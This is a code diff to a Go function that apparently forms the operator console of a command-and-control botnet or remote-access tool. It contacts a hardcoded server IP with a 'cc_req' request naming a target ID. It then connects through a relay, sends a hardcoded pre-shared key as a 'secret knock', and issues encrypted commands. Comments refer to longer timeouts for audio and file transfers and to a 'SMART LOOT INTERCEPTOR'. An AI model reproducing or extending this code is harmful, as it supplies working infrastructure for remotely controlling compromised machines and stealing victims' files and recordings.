@@ -216,25 +216,34 @@ func executeRotatingCommand(id, cmd string) string {
 	// 1. ROUTE REQUEST
 	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
 	if err != nil {
-		return "[red]Registry Unreachable[-]"
+		return "[red]Brain Unreachable[-]"
 	}
 	json.NewEncoder(c).Encode(AuthRequest{Type: "cc_req", TargetID: id, Key: currentSecret})
 	var r RoutingInfo
 	json.NewDecoder(c).Decode(&r)
 	c.Close()
 	if r.RelayAddr == "" {
-		return "[red]Pin Lost[-]"
+		return "[red]Target Offline/Busy[-]"
 	}
 
-	// 2. CONNECT
+	// 2. CONNECT TO RELAY
 	time.Sleep(200 * time.Millisecond)
 	conn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
 	if err != nil {
-		return "[red]Relay Refused[-]"
+		return "[red]Relay Connection Refused[-]"
 	}
 	defer conn.Close()
 
-	// 3. KEY INJECTION
+	// --- 🔐 THE V3 SECRET KNOCK (PSK) ---
+	// This MUST be the first thing sent to Port 5001
+	const PSK = "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
+	_, err = conn.Write([]byte(PSK))
+	if err != nil {
+		return "[red]Handshake Failed: Write Error[-]"
+	}
+	// ------------------------------------
+
+	// 3. KEY INJECTION (For AES-GCM/CBC encryption)
 	sessionKey := generateSessionKey()
 	conn.Write(sessionKey)
 
@@ -243,15 +252,15 @@ func executeRotatingCommand(id, cmd string) string {
 	fmt.Fprintf(conn, "%s\n", enc)
 
 	// 5. RECEIVE & INTERCEPT
-	conn.SetReadDeadline(time.Now().Add(15 * time.Second)) // Increased for file transfers
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second)) // Longer for audio/files
 	reply, err := bufio.NewReader(conn).ReadString('\n')
 	if err != nil {
-		return "[red]Timeout/Relay Closed[-]"
+		return "[red]Relay Timed Out / Closed[-]"
 	}
 
 	p, err := decryptPayload(strings.TrimSpace(reply), sessionKey)
 	if err != nil {
-		return "[red]Decryption Failure[-]"
+		return "[red]Decryption Failure (Stream Corrupted)[-]"
 	}
 
 	// --- SMART LOOT INTERCEPTOR ---
